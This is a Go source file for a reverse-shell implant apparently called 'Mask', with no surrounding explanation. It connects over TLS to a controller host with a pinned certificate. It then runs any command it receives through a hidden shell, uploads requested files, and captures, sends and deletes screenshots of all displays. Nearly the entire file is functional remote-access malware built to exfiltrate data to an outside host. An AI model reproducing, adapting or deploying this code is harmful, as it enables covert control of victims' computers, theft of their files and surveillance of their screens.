package main

import (
	"bytes"
	"crypto/sha256"
	"crypto/tls"
	"encoding/hex"
	"fmt"
	"image/png"
	"io"
	"net"
	"os"
	"os/exec"
	"runtime"
	"strconv"
	"strings"
	"syscall"

	"github.com/kbinani/screenshot"
)

//BUFFSIZE is the buffer for communication
const BUFFSIZE = 512

//MASKMANAGERIP connection string to the maskmanager
const MASKMANAGERIP = "IPPORT"

//PINNEDFPRINT fingerprint pinning to escape from MITM
const PINNEDKEY = `FPRINT`

func main() {
	fingerprint := strings.Replace(PINNEDKEY, ":", "", -1)
	fingerprintbytes, err := hex.DecodeString(fingerprint)
	if err != nil {
		fmt.Println(err)
	}
	tlsconfig := &tls.Config{InsecureSkipVerify: true}
	conn, err := tls.Dial("tcp", MASKMANAGERIP, tlsconfig)
	if err != nil {
		fmt.Println(err)
	}
	pinnedcertmatched := pinnedcertcheck(conn, fingerprintbytes)
	if pinnedcertmatched {
		getmaskedshell(conn)
	} else {
		fmt.Println("cert problem")
		os.Exit(1)
	}

}

func pinnedcertcheck(conn *tls.Conn, pinnedcert []byte) bool {
	certmatched := false
	for _, peercert := range conn.ConnectionState().PeerCertificates {
		//pubkeybytes, err := x509.MarshalPKIXPublicKey(peercert.PublicKey)
		hash := sha256.Sum256(peercert.Raw)
		if bytes.Compare(hash[0:], pinnedcert) == 0 {
			certmatched = true
		}
	}
	return certmatched
}

func getscreenshot() []string {
	n := screenshot.NumActiveDisplays()
	filenames := []string{}
	var fpth string
	for i := 0; i < n; i++ {
		bounds := screenshot.GetDisplayBounds(i)

		img, err := screenshot.CaptureRect(bounds)
		if err != nil {
			panic(err)
		}
		if runtime.GOOS == "windows" {
			fpth = `C:\Windows\Temp\`
		} else {
			fpth = `/tmp/`
		}
		fileName := fmt.Sprintf("maskScr-%d-%dx%d.png", i, bounds.Dx(), bounds.Dy())
		fullpath := fpth + fileName
		filenames = append(filenames, fullpath)
		file, _ := os.Create(fullpath)

		defer file.Close()
		png.Encode(file, img)

		//fmt.Printf("#%d : %v \"%s\"\n", i, bounds, fileName)
	}
	return filenames
}

func getmaskedshell(conn *tls.Conn) {
	var cmdbuff []byte
	var command string
	cmdbuff = make([]byte, BUFFSIZE)
	var osshell string
	//fmt.Println("Welcome to Mask")
	for {
		recvdbytes, _ := conn.Read(cmdbuff[0:])
		command = string(cmdbuff[0:recvdbytes])
		if strings.Index(command, "bye") == 0 {
			conn.Write([]byte("Good Bye !"))
			conn.Close()
			os.Exit(0)
		} else if strings.Index(command, "get") == 0 {
			fname := strings.Split(command, " ")[1]
			fmt.Println(fname)
			finflag := make(chan string)
			go sendFile(conn, fname, finflag)
			//<-finflag

		} else if strings.Index(command, "grabscreen") == 0 {
			filenames := getscreenshot()
			finflag := make(chan string)
			for _, fname := range filenames {
				go sendFile(conn, fname, finflag)
				<-finflag
				go removetempimages(filenames, finflag)
				//<-finflag

			}

		} else {
			//endcmd := "END"
			j := 0
			osshellargs := []string{"/C", command}

			if runtime.GOOS == "linux" {
				osshell = "/bin/sh"
				osshellargs = []string{"-c", command}

			} else {
				osshell = "cmd"
				//cmdout, _ := exec.Command("cmd", "/C", command).Output()
			}
			execcmd := exec.Command(osshell, osshellargs...)

			if runtime.GOOS == "windows" {
				execcmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
			}

			cmdout, _ := execcmd.Output()
			if len(cmdout) <= 512 {
				conn.Write([]byte(cmdout))
				//conn.Write([]byte(endcmd))
			} else {
				//fmt.Println(len(cmdout))
				//fmt.Println(string(cmdout))
				//fmt.Println("Length of string :")
				//fmt.Println(len(string(cmdout)))
				i := BUFFSIZE
				for {
					if i > len(cmdout) {
						//fmt.Println("From " + strconv.Itoa(j) + "to" + strconv.Itoa(len(cmdout)))
						//fmt.Println(string(cmdout[j:len(cmdout)]))
						conn.Write(cmdout[j:len(cmdout)])
						break
					} else {
						//fmt.Println("From " + strconv.Itoa(j) + "to" + strconv.Itoa(i))
						//fmt.Println(string(cmdout[j:i]))
						conn.Write(cmdout[j:i])
						j = i
					}
					i = i + BUFFSIZE
				}

			}

			cmdout = cmdout[:0]
		}

	}
}

func removetempimages(filenames []string, finflag chan string) {
	for _, name := range filenames {
		os.Remove(name)
	}
}

func sendFile(revConn net.Conn, fname string, finflag chan string) {

	file, _ := os.Open(strings.TrimSpace(fname))
	fileInfo, err := file.Stat()
	if err != nil {
		fmt.Println(err)
		return
	}
	fileSize := padString(strconv.FormatInt(fileInfo.Size(), 10), 10)
	fileName := padString(fileInfo.Name(), 64)
	//Sending filename and filesize
	revConn.Write([]byte(fileSize))
	revConn.Write([]byte(fileName))
	sendBuffer := make([]byte, BUFFSIZE)
	//sending file contents
	for {
		_, err = file.Read(sendBuffer)
		if err == io.EOF {
			break
		}
		revConn.Write(sendBuffer)
	}
	finflag <- "file sent"

	//Completed file sending
	return
}

func padString(retunString string, toLength int) string {
	for {
		lengtString := len(retunString)
		if lengtString < toLength {
			retunString = retunString + ":"
			continue
		}
		break
	}
	return retunString
}
